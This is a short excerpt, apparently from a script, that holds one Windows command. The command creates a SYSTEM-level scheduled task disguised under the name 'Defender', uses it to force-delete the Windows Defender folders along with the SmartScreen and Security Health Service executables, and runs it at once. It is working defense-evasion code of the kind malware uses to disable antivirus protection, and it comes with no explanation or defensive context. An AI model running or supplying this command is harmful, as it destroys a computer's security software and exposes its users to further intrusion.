...
schtasks /create /tn Defender /tr "powershell.exe -Command rm -r -fo 'C:\Program Files*\Windows Defender*'; rm -fo C:\Windows\System32\smartscreen.exe,C:\Windows\System32\SecurityHealthService.exe" /sc once /st 00:00 /RL HIGHEST /RU SYSTEM /F;schtasks /run /tn Defender
